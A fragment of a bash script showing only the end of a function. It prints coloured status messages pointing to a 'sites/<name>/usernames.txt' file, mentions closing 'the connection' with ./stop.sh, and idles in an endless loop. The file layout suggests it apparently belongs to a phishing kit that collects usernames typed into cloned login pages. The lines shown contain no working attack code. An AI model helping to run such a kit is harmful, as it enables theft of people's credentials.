...
printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Check:\e[0m\e[1;77m sites/%s/usernames.txt\e[0m\n\n" $server
printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Exit: Ctrl+C\n\n"
printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] After Exit: Please type ./stop.sh to close the connection. Enjoy...\n\n"
while [ true ]; do
	printf ""
done
}
